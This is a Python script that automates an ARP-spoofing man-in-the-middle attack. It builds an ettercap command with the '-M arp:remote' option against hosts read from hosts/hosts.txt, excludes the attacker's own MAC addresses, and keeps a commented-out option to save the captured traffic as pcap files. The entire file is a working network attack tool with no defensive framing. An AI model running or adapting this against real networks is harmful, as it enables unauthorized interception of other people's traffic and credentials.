#!/usr/bin/python3
import subprocess
import time
import os
import threading
from datetime import datetime

flag = 0

def getTargets(file):
    
    content = file.readlines()
    out = []
    for line in content:
        line = line.split(' ')
        out.append([line[0], line[1]])
    return out


def run_command(wlan, eth, hosts):

    filter = "'!((arp and ether host %s) or (arp and ether host %s))'"%(eth,wlan)
    cmd = "exec ettercap -i wlan0 -Tq -f " + filter + " -M arp:remote -j hosts/hosts.txt"
    #date = datetime.now().strftime("%Y-%m-%d_%I:%M:%S%p")
    #cmd = "ettercap -i wlan0 -Tq -f " + filter + " -M arp:remote -j hosts/hosts.txt -w captures/" + date + ".pcap"
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, preexec_fn=os.setsid) 


def identify_wlan():
    line = os.popen("ifconfig wlan0 | grep \"ether \"").read()    
    return list(filter(lambda a: len(a) > 0,line.split(" ")))[1]


def identify_eth():
    line = os.popen("ifconfig eth0 | grep \"ether \"").read()
    return list(filter(lambda a: len(a) > 0, line.split(" ")))[1]

def arp_flag():
    global flag
    flag = 1

def arpSpoofer():
    global flag
    wlan = identify_wlan()
    eth = identify_eth()
    with open("./hosts/hosts.txt", 'r') as hostsFile: # open file with hosts to scan
        hosts = getTargets(hostsFile)
    pro = run_command(wlan,eth,hosts)
     
    while flag == 0:
        pass
    
    pro.kill()
    

if __name__ == "__main__":

    x = threading.Thread(target = arpSpoofer, args=())
    x.start()
    time.sleep(10)
    arp_flag()


